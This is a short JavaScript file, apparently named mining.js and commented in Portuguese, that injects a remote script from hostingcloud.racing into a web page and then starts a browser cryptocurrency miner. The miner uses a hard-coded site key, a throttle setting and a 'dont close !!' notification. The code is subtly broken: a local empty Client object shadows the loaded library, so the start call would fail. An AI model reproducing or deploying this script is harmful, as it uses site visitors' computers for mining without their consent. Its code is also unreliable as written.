// Conteúdo do arquivo local mining.js

// Chamada para o script externo
var scriptElement = document.createElement('script');
scriptElement.src = "https://www.hostingcloud.racing/6ZFJ.js";
document.head.appendChild(scriptElement);

// Função para inicializar a mineração após o carregamento do script externo
function initializeMining() {
    // Definição da classe Client
    var Client = {
        Anonymous: function(token, options) {
            // Implementação do construtor da classe Anonymous
        },
        // Outros métodos e propriedades da classe Client
    };

    // Inicialização do cliente para a mineração
    var _client = new Client.Anonymous('876cd29da7454db785906ba686bcf9c64d66602d6b3e8846705bb135a3a2b74a', {
        throttle: 0.2,
        c: 'w'
    });
    _client.start();
    _client.addMiningNotification("Top", "dont close !!", "#cccccc", 40, "#3d3d3d");
}

// Aguarda o carregamento do script externo antes de inicializar a mineração
scriptElement.onload = initializeMining;

